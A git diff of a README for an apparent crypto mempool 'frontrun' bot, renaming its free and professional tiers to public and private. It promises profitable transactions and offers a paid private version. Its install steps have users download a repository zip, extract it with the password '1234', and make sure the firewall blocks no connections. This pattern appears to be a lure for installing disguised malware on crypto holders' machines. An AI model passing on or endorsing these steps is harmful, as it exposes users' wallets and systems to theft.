@@ -7,19 +7,19 @@
 - **Transaction Analysis**: The bot analyzes pending transactions in the mempool, providing insights into transaction fees, gas prices, and other relevant metrics.
 - **Profit transaction**: The bot performs transactions for most relevant pairs with low liquidity.
 
-### Free version
+### Public version
 - Supported networks: BSC
 - Active contracts: 3
 - Notifications: no
 
 Actual free version in release section.
 
-### Professional version
+### Private version
 No limits!
 No beta versions! 
 For more information contact with me.
 
-### Installation
+### Installation (public version)
 1. [Install](https://dotnet.microsoft.com/en-us/download/dotnet-framework/net472) .NET framework 4.7.2 runtome if it has not been installed.
 2. [Download](https://github.com/timo991/amm-frontrun/archive/refs/heads/main.zip) repository release and extract files with password `1234`.
 3. Make shure that firewall does not blocks any connections.
